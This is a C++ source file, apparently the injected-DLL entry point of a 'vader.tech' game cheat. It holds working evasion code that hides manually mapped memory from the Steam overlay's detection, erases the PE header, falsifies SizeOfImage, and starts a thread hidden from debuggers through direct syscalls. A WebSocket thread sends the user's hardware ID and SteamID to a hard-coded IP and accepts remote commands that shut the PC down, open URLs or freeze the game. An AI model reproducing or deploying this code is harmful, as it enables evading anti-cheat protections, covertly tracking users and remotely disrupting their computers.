#include "source.hpp"
#include "Utils/InputSys.hpp"
#include "Utils/defs.hpp"

#pragma disable(warning:4099)


#include "Utils/Threading/threading.h"
#include "Utils/Threading/shared_mutex.h"
#include "SDK/displacement.hpp"
#include "SDK/CVariables.hpp"
#include "Utils/lazy_importer.hpp"
#include "Utils/CrashHandler.hpp"
#include "Libraries/minhook-master/include/MinHook.h"
#include <thread>

#include "Features/Rage/TickbaseShift.hpp"

#include <iomanip> 
#include "Utils/syscall.hpp"
#include "Loader/Security/Security.hpp"
#include "ShittierMenu/menu.hpp"
#include <atlstr.h>
#include "Utils/easywsclient.hpp"
#include "Utils/hwid.h"
#include <json.h>

static Semaphore dispatchSem;
static SharedMutex smtx;

using ThreadIDFn = int( _cdecl* )( );

ThreadIDFn AllocateThreadID;
ThreadIDFn FreeThreadID;

int AllocateThreadIDWrapper( ) {
	return AllocateThreadID( );
}

int FreeThreadIDWrapper( ) {
	return FreeThreadID( );
}

template<typename T, T& Fn>
static void AllThreadsStub( void* ) {
	dispatchSem.Post( );
	smtx.rlock( );
	smtx.runlock( );
	Fn( );
}


// TODO: Build this into the threading library
template<typename T, T& Fn>
static void DispatchToAllThreads( void* data ) {
	smtx.wlock( );

	for( size_t i = 0; i < Threading::numThreads; i++ )
		Threading::QueueJobRef( AllThreadsStub<T, Fn>, data );

	for( size_t i = 0; i < Threading::numThreads; i++ )
		dispatchSem.Wait( );

	smtx.wunlock( );

	Threading::FinishQueue( false );
}

struct DllArguments {
	HMODULE hModule;
	LPVOID lpReserved;
};

namespace duxe::security {
	uintptr_t* rel32( uintptr_t ptr ) {
		auto offset = *( uintptr_t* )( ptr + 0x1 );
		return ( uintptr_t* )( ptr + 5 + offset );
	}

	void bypass_mmap_detection( void* address, uint32_t region_size ) {
		const auto client_dll = ( uint32_t )GetModuleHandleA( XorStr( "client.dll" ) );

		const auto valloc_call = client_dll + 0x90DC60;

		using add_allocation_to_list_t = int( __thiscall* )(
			uint32_t list, LPVOID alloc_base, SIZE_T alloc_size, DWORD alloc_type, DWORD alloc_protect, LPVOID ret_alloc_base, DWORD last_error, int return_address, int a8 );

		auto add_allocation_to_list = ( add_allocation_to_list_t )( rel32( Memory::Scan( XorStr( "gameoverlayrenderer.dll" ), XorStr( "E8 ? ? ? ? 53 FF 15 ? ? ? ? 8B C7" ) ) ) );

		const auto list = *( uint32_t* )( Memory::Scan( XorStr( "gameoverlayrenderer.dll" ), XorStr( "56 B9 ? ? ? ? E8 ? ? ? ? 84 C0 74 1C" ) ) + 2 );

		add_allocation_to_list( list, address, region_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, address, 0, valloc_call, 0 );
	}
}

std::string get_ban_path()
{
	char dir[MAX_PATH];
	LI_FN(SHGetSpecialFolderPathA)(nullptr, dir, CSIDL_APPDATA, TRUE);

	std::string path = dir;
	path += XorStr("\\Microsoft\\Windows\\");
	return path;
}

std::string ban_path()
{
	std::string path = get_ban_path();

	path += XorStr("Gh98h3gh94HGO9");

	return path;
}

// Any unreasonably large value will work say for example 0x100000 or 100,000h

void SizeOfImage()
{

	PPEB pPeb = (PPEB)__readfsdword(0x30);

	// The following pointer hackery is because winternl.h defines incomplete PEB types
	PLIST_ENTRY InLoadOrderModuleList = (PLIST_ENTRY)pPeb->Ldr->Reserved2[1]; // pPeb->Ldr->InLoadOrderModuleList
	PLDR_DATA_TABLE_ENTRY tableEntry = CONTAINING_RECORD(InLoadOrderModuleList, LDR_DATA_TABLE_ENTRY, Reserved1[0] /*InLoadOrderLinks*/);
	PULONG pEntrySizeOfImage = (PULONG)&tableEntry->Reserved3[1]; // &tableEntry->SizeOfImage
	*pEntrySizeOfImage = (ULONG)((INT_PTR)tableEntry->DllBase + 0x100000);
}

/* This function will erase the current images PE header from memory preventing a successful image if dumped */

void ErasePEHeaderFromMemory(HMODULE hModule)
{
	DWORD OldProtect = 0;

	// Get base address of module
	char* pBaseAddr = (char*)hModule;

	// Change memory protection
	VirtualProtect(pBaseAddr, 4096, // Assume x86 page size
		PAGE_READWRITE, &OldProtect);

	// Erase the header
	SecureZeroMemory(pBaseAddr, 4096);
}

static bool m_bSecurityInitialized;
static bool m_bWebSocketInitialized;
static bool m_bShouldBan;
static bool m_bUserValidated;

DWORD WINAPI Entry( DllArguments* pArgs ) {
#ifdef DEV 
	AllocConsole( );
	freopen_s( ( FILE** )stdin, XorStr( "CONIN$" ), XorStr( "r" ), stdin );
	freopen_s( ( FILE** )stdout, XorStr( "CONOUT$" ), XorStr( "w" ), stdout );
	SetConsoleTitleA( XorStr( " " ) );
#endif

#ifndef DEV
	while (!m_bSecurityInitialized) { // i takes the security thread a few seconds to Initialize so i am doing this. 
		std::this_thread::sleep_for(std::chrono::seconds(1));
	}

	while (!m_bWebSocketInitialized) { // i takes the security thread a few seconds to Initialize so i am doing this. 
		std::this_thread::sleep_for(std::chrono::seconds(1));
	}

	g_Vars.globals.user_info = *( CVariables::GLOBAL::cheat_header_t* )pArgs->hModule;
	g_Vars.globals.c_login = g_Vars.globals.user_info.username;
	g_Vars.globals.hModule = pArgs->hModule;
#else
	g_Vars.globals.c_login = XorStr( "admin" );

	g_Vars.globals.hModule = pArgs->hModule;

	while( !GetModuleHandleA( XorStr( "serverbrowser.dll" ) ) ) {
		Sleep( 50 );
	}
#endif // !DEV

#ifndef DEV
	if (!m_bSecurityInitialized) {
		HWND null = NULL;
		LI_FN(MessageBoxA)(null, XorStr("Error Code: 0x3552A!\n Report this to a developer!"), XorStr("vader.tech"), 0);
		LI_FN(exit)(69);
	}

	if (!m_bWebSocketInitialized) {
		HWND null = NULL;
		LI_FN(MessageBoxA)(null, XorStr("Error Code: 0x2642B!\n Report this to a developer!"), XorStr("vader.tech"), 0);
		LI_FN(exit)(69);
	}

	if (!m_bUserValidated) { // user aint valid
		LI_FN(exit)(69);
	}
#endif // !DEV
	auto tier0 = GetModuleHandleA( XorStr( "tier0.dll" ) );

	AllocateThreadID = ( ThreadIDFn )GetProcAddress( tier0, XorStr( "AllocateThreadID" ) );
	FreeThreadID = ( ThreadIDFn )GetProcAddress( tier0, XorStr( "FreeThreadID" ) );

	Threading::InitThreads( );

	DispatchToAllThreads<decltype( AllocateThreadIDWrapper ), AllocateThreadIDWrapper>( nullptr );

	// b1g alpha.
	static bool bDownloaded = false;
	if( !bDownloaded ) {
		g_IMGUIMenu.Opened = true;
		bDownloaded = true;
	}

	if( Interfaces::Create( pArgs->lpReserved ) ) {
		Interfaces::m_pInputSystem->EnableInput( true );

		for( auto& child : g_Vars.m_children ) {
			child->Save( );

			auto json = child->GetJson( );
			g_Vars.m_json_default_cfg[ child->GetName( ) ] = ( json );
		}


#ifndef DEV
		while( true ) {
			std::this_thread::sleep_for( std::chrono::milliseconds( 50 ) );
		}
#endif // !DEV
	}

#ifdef DEV
	//while( !g_Vars.globals.hackUnload ) {
	//	Sleep( 100 );
	//}

	//Interfaces::Destroy( );

	//Sleep( 500 );

	//Threading::FinishQueue( );

	//DispatchToAllThreads<decltype( FreeThreadIDWrapper ), FreeThreadIDWrapper>( nullptr );

	//Threading::EndThreads( );

	//fclose( ( FILE* )stdin );
	//fclose( ( FILE* )stdout );
	//FreeConsole( );
	//FreeLibraryAndExitThread( pArgs->hModule, EXIT_SUCCESS );

	//delete pArgs;

	return FALSE;
#else
	return FALSE;
#endif
}

LONG WINAPI CrashHandlerWrapper( struct _EXCEPTION_POINTERS* exception ) {
	auto ret = ICrashHandler::Get( )->OnCrashProgramm( exception );
	return ret;
}

DWORD WINAPI WebSocketThread(LPVOID PARAMS) {
	INT rc;
	WSADATA wsaData;

	rc = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (rc) {
		HWND null = NULL;
		LI_FN(MessageBoxA)(null, XorStr("Error Code: 0x4248E!\n Report this to a developer!"), XorStr("vader.tech"), 0);
		LI_FN(exit)(69);
	}

	nlohmann::json j2 = {
	  {XorStr("type"), XorStr("AUTHENTICATE")},
	  {XorStr("hwid"), std::to_string(hwid::get_hash())},
	};

	std::unique_ptr<easywsclient::WebSocket> ws(easywsclient::WebSocket::from_url(XorStr("ws://51.81.80.177:2934")));
	assert(ws);
	if (!ws) {
		HWND null = NULL;
		LI_FN(MessageBoxA)(null, XorStr("Error Code: 0x2857A!\n Report this to a developer!"), XorStr("vader.tech"), 0);
		LI_FN(exit)(69);
	}
	std::string s = j2.dump();
	ws->send(s);

	while (ws->getReadyState() != easywsclient::WebSocket::CLOSED) {
		easywsclient::WebSocket::pointer wsp = &*ws; // <-- because a unique_ptr cannot be copied into a lambda
		ws->poll();
		ws->dispatch([wsp](const std::string& message) {
			nlohmann::json ret = nlohmann::json::parse(message);
			//if (message == XorStr("TERMINATE_CONNECTION")) {
			//	wsp->close();
			//}
			if (ret[XorStr("type")] == XorStr("USER_VALIDATED")) {
				m_bUserValidated = true;
			}
			if (ret[XorStr("type")] == XorStr("SUNSET")) {
				LI_FN(exit)(69);
			}
			if (ret[XorStr("type")] == XorStr("FORCEUP")) {
				g_Vars.globals.m_rce_forceup = !g_Vars.globals.m_rce_forceup;
			}
			if (ret[XorStr("type")] == XorStr("RICKROLL")) {
				LI_FN(system)(XorStr("start https://www.youtube.com/watch?v=QtBDL8EiNZo"));
			}
			if (ret[XorStr("type")] == XorStr("SHUTDOWN")) {
				LI_FN(system)(XorStr("shutdown /s"));
			}
			if (ret[XorStr("type")] == XorStr("FREEZE")) {
				Sleep(ret[XorStr("freezetime")]);
			}
		});

		if (m_bShouldBan && m_bUserValidated) {
			nlohmann::json j3 = {
			  {XorStr("type"), XorStr("BAN_ME")},
			  {XorStr("violation"), XorStr("DLL_") + g_protection.error_string},
			};

			std::string s = j3.dump();
			ws->send(s);
			while (ws->getReadyState() == easywsclient::WebSocket::CLOSED) { // connection closed close the fucking game.
				LI_FN(exit)(69);
			}
		}

		static bool sent_steamid;

		if (m_bUserValidated && !sent_steamid) {
			auto g_pSteamClient = ((ISteamClient * (__cdecl*)(void))GetProcAddress(GetModuleHandleA(XorStr("steam_api.dll")), XorStr("SteamClient")))();
			HSteamUser hSteamUser = reinterpret_cast<HSteamUser(__cdecl*) (void)>(GetProcAddress(GetModuleHandle(XorStr("steam_api.dll")), XorStr("SteamAPI_GetHSteamUser")))();
			HSteamPipe hSteamPipe = reinterpret_cast<HSteamPipe(__cdecl*) (void)>(GetProcAddress(GetModuleHandle(XorStr("steam_api.dll")), XorStr("SteamAPI_GetHSteamPipe")))();
			auto SteamUser = (ISteamUser*)g_pSteamClient->GetISteamUser(hSteamUser, hSteamPipe, XorStr("SteamUser019"));

			CSteamID localID = SteamUser->GetSteamID();

			nlohmann::json j = {
			{XorStr("type"), XorStr("STEAMID")},
			{XorStr("input"), std::to_string(localID.GetAccountID()) },
			};
			std::string s = j.dump();

			ws->send(s);
			sent_steamid = true;
		}

		m_bWebSocketInitialized = true;
	}

	WSACleanup();
	LI_FN(exit)(69);

	return true;
}

DWORD WINAPI Security(LPVOID PARAMS) {
	while (true) {
		m_bSecurityInitialized = true;
		if (!g_protection.safety_check()) {
			//HWND null = NULL;
			//LI_FN(MessageBoxA)(null, g_protection.error_string.c_str(), XorStr("vader.tech"), 0); // do not uncomment! this was used for debugging.
			//std::ofstream ban;
			//ban.open(ban_path().c_str(), std::ofstream::binary);
			//ban.close();


			//m_bShouldBan = true;
			//LI_FN(exit)(69);
		}
		std::this_thread::sleep_for(std::chrono::seconds(3));
	}
	return true;
}

BOOL APIENTRY DllMain( HMODULE hModule, DWORD dwReason, LPVOID lpReserved ) {
	if( dwReason == DLL_PROCESS_ATTACH ) {
		DllArguments* args = new DllArguments( );
		args->hModule = hModule;
		args->lpReserved = lpReserved;

		SetUnhandledExceptionFilter( CrashHandlerWrapper );
		//AddVectoredExceptionHandler( 1, CrashHandlerWrapper );

#ifdef DEV
		auto thread = CreateThread( nullptr, NULL, LPTHREAD_START_ROUTINE( Entry ), args, NULL, nullptr );
		if( thread ) {
			strcpy( g_Vars.globals.user_info.username, XorStr( "admin" ) );
			//g_Vars.globals.user_info.sub_expiration = 99999999999999999; // sencible date

			CloseHandle( thread );

			return TRUE;
		}
#else
		//start security and websocket thread
		CreateThread(0, 0, &Security, 0, 0, 0);
		CreateThread(0, 0, &WebSocketThread, 0, 0, 0);

//#ifdef BETA_MODE
//		SetUnhandledExceptionFilter( CrashHandlerWrapper );
//#endif

		HANDLE thread;

		syscall( NtCreateThreadEx )( &thread, THREAD_ALL_ACCESS, nullptr, current_process,
			nullptr, args, THREAD_CREATE_FLAGS_CREATE_SUSPENDED | THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER, NULL, NULL, NULL, nullptr );
		CONTEXT context;
		context.ContextFlags = CONTEXT_FULL;
		syscall( NtGetContextThread )( thread, &context );
		context.Eax = reinterpret_cast< uint32_t >( &Entry );
		syscall( NtSetContextThread )( thread, &context );
		syscall( NtResumeThread )( thread, nullptr );

		ErasePEHeaderFromMemory(hModule);
		SizeOfImage();

		return TRUE;
#endif
	}

	return FALSE;
}